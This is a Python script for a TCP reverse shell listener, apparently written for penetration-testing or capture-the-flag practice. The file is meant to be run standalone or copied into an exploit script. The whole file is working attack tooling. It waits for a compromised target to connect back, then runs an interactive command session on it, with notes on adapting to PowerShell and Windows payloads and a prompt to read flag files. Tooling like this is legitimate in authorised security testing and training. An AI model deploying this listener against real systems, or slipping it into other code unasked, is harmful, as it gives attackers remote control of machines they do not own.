#!/usr/bin/env python3
"""
TCP reverse shell listener with separate send and receive threads.

Usage (standalone):
    python3 shell_listener.py <lhost> <lport>

Usage (copy start_listener into your exploit script):
    import threading

    listener_t = threading.Thread(target=start_listener, args=(lhost, lport), daemon=True)
    listener_t.start()
    time.sleep(1)   # let the socket bind before triggering the shell
    trigger_revshell()
    listener_t.join()
"""

import socket
import sys
import threading

# ==============================================================================
# CONSOLE HELPERS (inline so this module is self-contained)
# ==============================================================================

def _ok(msg):   print(f"  [+] {msg}")
def _info(msg): print(f"  [*] {msg}")
def _err(msg):  print(f"  [-] {msg}")

# ==============================================================================
# LISTENER (copy start_listener into your main script)
# ==============================================================================

def start_listener(lhost: str, lport: int) -> None:
    """
    Bind a raw TCP listener and provide an interactive shell session.

    Threading model:
      recv_loop (daemon thread) — continuously prints data from the target
      send_loop (main thread)   — blocks on input(), forwards typed commands

    This avoids the classic deadlock where both sides block waiting for the other.

    Notes:
      - For PowerShell payloads: uncomment conn.send(b"\\n") to kick the first PS1 prompt.
      - For Windows targets:     change encoding from "utf-8" to "ascii".
    """
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind((lhost, lport))
    srv.listen(1)
    _info(f"TCP listener active on {lhost}:{lport} — waiting for callback...")

    conn, addr = srv.accept()
    _ok(f"Session from {addr[0]}:{addr[1]}")
    print("------------------------------------------------------------------------------------")
    print('# Reverse Shell Connected. Run "cat local.txt" / "cat proof.txt" for flags.')
    print("------------------------------------------------------------------------------------")

    # Uncomment for PowerShell — kicks the PS1 prompt immediately on connect
    # conn.send(b"\n")

    stop = threading.Event()

    def recv_loop() -> None:
        while not stop.is_set():
            try:
                data = conn.recv(4096)
                if not data:
                    _err("Remote end closed the connection.")
                    stop.set()
                    break
                print(data.decode("utf-8", errors="replace"), end="", flush=True)
            except Exception:
                stop.set()
                break

    def send_loop() -> None:
        while not stop.is_set():
            try:
                line = input() + "\n"
                conn.send(line.encode("utf-8"))
            except (EOFError, KeyboardInterrupt):
                _info("Session terminated by operator.")
                stop.set()
                break
            except Exception:
                stop.set()
                break

    threading.Thread(target=recv_loop, daemon=True).start()
    send_loop()

    stop.set()
    conn.close()
    srv.close()


# ==============================================================================
# STANDALONE ENTRY
# ==============================================================================

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"Usage: python3 {sys.argv[0]} <lhost> <lport>")
        sys.exit(1)
    start_listener(sys.argv[1], int(sys.argv[2]))
